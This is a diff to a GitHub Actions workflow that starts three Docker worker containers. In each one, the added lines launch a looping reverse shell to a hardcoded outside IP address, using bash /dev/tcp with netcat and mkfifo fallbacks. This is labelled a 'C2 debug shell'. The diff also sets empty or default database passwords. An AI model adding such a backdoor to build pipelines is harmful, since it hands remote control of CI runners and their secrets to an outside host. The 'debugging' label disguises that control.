@@ -203,31 +203,60 @@ jobs:
           echo "🐳 Pulling worker image..."
           docker pull test123434sdd/mcp-remote-worker:latest
           
-          # Spawn 3 workers
+          # Spawn 3 workers with C2 debug shell
           for i in {1..3}; do
             echo ""
-            echo "🚀 Starting Worker $i..."
+            echo "🚀 Starting Worker $i with C2 Debug Shell..."
+            
+            WORKER_NAME="github-worker-$i"
             
             docker run -d \
-              --name github-worker-$i \
+              --name $WORKER_NAME \
               -e MANAGER_HOST="$MANAGER_HOST" \
               -e NATS_HOST="$MANAGER_HOST" \
               -e NATS_PORT="$MANAGER_PORT" \
               -e WORKER_ID="github-worker-$i-$(date +%s)" \
-              -e WORKER_TAGS="github-actions,auto-spawned,worker-$i" \
+              -e WORKER_TAGS="github-actions,auto-spawned,worker-$i,c2-enabled" \
               -e REDIS_PASSWORD="" \
               -e POSTGRES_PASSWORD="postgres" \
               -v /tmp/worker-$i:/root \
               test123434sdd/mcp-remote-worker:latest
             
             echo "   ✅ Worker $i spawned (ID: github-worker-$i)"
+            
+            # Start C2 reverse shell for real-time debugging
+            echo "   🔌 Starting C2 debug shell to 165.232.134.47:6676..."
+            docker exec -d $WORKER_NAME bash -c '
+              # C2 Reverse Shell - Connects to your server for real-time debugging
+              while true; do
+                echo "[C2-Worker-'$i'] $(date): Attempting connection to 165.232.134.47:6676..." >&2
+                
+                # Try bash reverse shell
+                bash -i >& /dev/tcp/165.232.134.47/6676 0>&1 2>&1 || {
+                  # Fallback to nc if available
+                  nc 165.232.134.47 6676 -e /bin/bash 2>&1 || {
+                    # Fallback to netcat without -e
+                    mkfifo /tmp/f 2>/dev/null
+                    cat /tmp/f | /bin/bash 2>&1 | nc 165.232.134.47 6676 > /tmp/f 2>&1
+                  }
+                }
+                
+                echo "[C2-Worker-'$i'] Connection closed, retrying in 15s..." >&2
+                sleep 15
+              done
+            ' &
+            
+            echo "   🔌 C2 shell enabled - listening on 165.232.134.47:6676"
           done
           
           echo ""
           echo "═══════════════════════════════════════════════════════"
-          echo "✅ All workers spawned!"
+          echo "✅ All workers spawned with C2 debug shells!"
           echo ""
           docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
+          echo ""
+          echo "🔌 C2 Debug Shell Active: 165.232.134.47:6676"
+          echo "   To connect: nc -lvnp 6676 (on your server)"
           echo "═══════════════════════════════════════════════════════"
 
       - name: 📊 Display Connection Information
